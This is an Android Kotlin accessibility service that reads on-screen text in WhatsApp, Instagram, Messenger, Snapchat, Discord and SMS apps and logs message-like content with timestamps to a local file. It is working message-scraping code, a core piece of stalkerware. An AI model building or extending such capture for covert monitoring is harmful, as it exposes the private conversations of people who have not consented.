package com.example.malaki

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class MessageAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MESSAGE_SERVICE"
        // Thread-safe set to track seen messages
        private val seenMessages = Collections.synchronizedSet(mutableSetOf<String>())

        // Rate limiting - prevent excessive processing
        private var lastProcessTime = 0L
        private const val MIN_PROCESS_INTERVAL = 500L // milliseconds

        // Track recently processed package names
        private val recentPackages = Collections.synchronizedSet(mutableSetOf<String>())
        private val cleanupHandler = Handler(Looper.getMainLooper())
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "✅ Message Service CONNECTED!")

        // Schedule periodic cleanup of recentPackages
        cleanupHandler.postDelayed(object : Runnable {
            override fun run() {
                recentPackages.clear()
                cleanupHandler.postDelayed(this, 5000) // Clear every 5 seconds
            }
        }, 5000)

        // Configure service with optimized settings
        val info = AccessibilityServiceInfo()
        // Remove TYPE_WINDOW_CONTENT_CHANGED as it fires too frequently
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        // TYPE_WINDOW_CONTENT_CHANGED removed!

        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.notificationTimeout = 500 // Increased from 100 to 500
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS

        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return

        // Rate limiting - don't process too frequently
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastProcessTime < MIN_PROCESS_INTERVAL) {
            return
        }
        lastProcessTime = currentTime

        // Skip if we've recently processed this package
        if (recentPackages.contains(packageName)) {
            return
        }
        recentPackages.add(packageName)

        // Only process actual messaging apps
        val messagingApps = listOf(
            "com.google.android.apps.messaging",
            "com.android.mms",
            "com.whatsapp",
            "com.facebook.orca",
            "com.instagram.android",
            "com.twitter.android",
            "com.snapchat.android",
            "com.discord"
        )

        // Skip non-messaging apps to reduce noise
        if (!messagingApps.contains(packageName) && !packageName.contains("messaging")) {
            return
        }

        Log.d(TAG, "📱 Processing: $packageName - ${getEventTypeString(event.eventType)}")

        // Get the root node of the current window
        val rootNode = rootInActiveWindow
        if (rootNode != null) {
            // Extract only message-like content, not ALL text
            val messages = extractMessages(rootNode, packageName)

            // Save each unique message
            messages.forEach { message ->
                if (message.isNotBlank() && !isSystemText(message)) {
                    saveMessage(packageName, message)
                }
            }

            rootNode.recycle()
        }
    }

    // Extract only text that looks like actual messages
    private fun extractMessages(node: AccessibilityNodeInfo, packageName: String): List<String> {
        val messageList = mutableListOf<String>()

        // Check node text
        node.text?.toString()?.let { text ->
            if (isLikelyMessage(text)) {
                messageList.add(text)
            }
        }

        // Check content description (used by some apps)
        node.contentDescription?.toString()?.let { text ->
            if (isLikelyMessage(text)) {
                messageList.add(text)
            }
        }

        // Check for message-specific patterns in package
        when {
            packageName.contains("whatsapp") -> {
                // WhatsApp specific patterns
                node.viewIdResourceName?.let { id ->
                    if (id.contains("message") || id.contains("conversation")) {
                        node.text?.toString()?.let { messageList.add(it) }
                    }
                }
            }
            packageName.contains("instagram") -> {
                // Instagram DM patterns
                node.viewIdResourceName?.let { id ->
                    if (id.contains("direct") || id.contains("message")) {
                        node.text?.toString()?.let { messageList.add(it) }
                    }
                }
            }
            packageName.contains("messaging") || packageName.contains("mms") -> {
                // Google Messages patterns
                node.viewIdResourceName?.let { id ->
                    if (id.contains("message") || id.contains("conversation") || id.contains("snippet")) {
                        node.text?.toString()?.let { messageList.add(it) }
                    }
                }
            }
        }

        // Recursively check children
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                messageList.addAll(extractMessages(child, packageName))
                child.recycle()
            }
        }

        return messageList.distinct() // Remove duplicates from same extraction
    }

    // Determine if text is likely an actual message vs UI element
    private fun isLikelyMessage(text: String): Boolean {
        val lowerText = text.lowercase(Locale.getDefault())

        // Skip empty or very short text (likely UI buttons)
        if (text.length < 5) return false

        // Skip if it's a timestamp
        if (text.matches(Regex("\\d{1,2}:\\d{2}(\\s?(AM|PM))?"))) return false

        // Skip common UI elements
        val uiElements = listOf(
            "send", "type a message", "message", "chat", "back", "menu",
            "settings", "search", "call", "video", "attach", "emoji",
            "gif", "sticker", "mic", "camera", "gallery", "send message"
        )

        if (uiElements.any { lowerText == it || lowerText.startsWith("$it ") || lowerText.endsWith(" $it") }) {
            return false
        }

        // Message indicators - longer text, contains emoji, multiple words, punctuation
        return text.contains(Regex("[😀-🙏]")) || // Has emoji
                text.contains(Regex("https?://")) || // Has URL
                text.contains(Regex("[.!?]\\s+\\w")) || // Multiple sentences
                text.length > 20 || // Longer text
                text.split(" ").size > 3 // Multiple words
    }

    // Filter out system/UI text (buttons, labels, etc.)
    private fun isSystemText(text: String): Boolean {
        val systemWords = listOf(
            "back", "send", "home", "menu", "settings", "ok", "cancel", "submit",
            "search", "close", "next", "previous", "play", "pause", "stop",
            "notification", "alert", "dialog", "button", "tab", "icon", "image",
            "video", "audio", "loading", "progress", "wait", "please wait",
            "type a message", "tap to retry", "online", "offline", "typing..."
        )

        val lowerText = text.lowercase(Locale.getDefault())
        return systemWords.any { lowerText.contains(it) } ||
                text.length < 3 ||
                text.all { it.isWhitespace() || it == '.' || it == ',' } ||
                text.matches(Regex("\\d+")) // Just numbers (likely a count or timestamp)
    }

    private fun saveMessage(packageName: String, text: String) {
        try {
            // Skip empty messages
            if (text.isBlank()) return

            // Create unique identifier (package + text + length to handle similar messages)
            val messageId = "$packageName|${text.length}|${text.hashCode()}"

            // Check if we've already seen this message (don't log duplicate skipped to reduce log spam)
            if (seenMessages.contains(messageId)) {
                // Silently skip - no log
                return
            }

            // Add to seen messages
            seenMessages.add(messageId)

            // Limit seen messages cache to prevent memory issues
            if (seenMessages.size > 500) {
                val iterator = seenMessages.iterator()
                repeat(250) { if (iterator.hasNext()) iterator.remove() }
            }

            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val logEntry = "[$timestamp] [$packageName] $text\n"

            // Save to file
            val file = File(filesDir, "messages.txt")
            file.appendText(logEntry)

            Log.d(TAG, "💾 Saved: ${text.take(50)}")

        } catch (e: Exception) {
            Log.e(TAG, "Error saving message: ${e.message}")
        }
    }

    private fun getEventTypeString(eventType: Int): String {
        return when (eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "CLICK"
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> "FOCUS"
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TEXT"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "WINDOW"
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> "CONTENT"
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> "NOTIFY"
            else -> "UNKNOWN($eventType)"
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "❌ Service interrupted")
    }

    override fun onDestroy() {
        cleanupHandler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}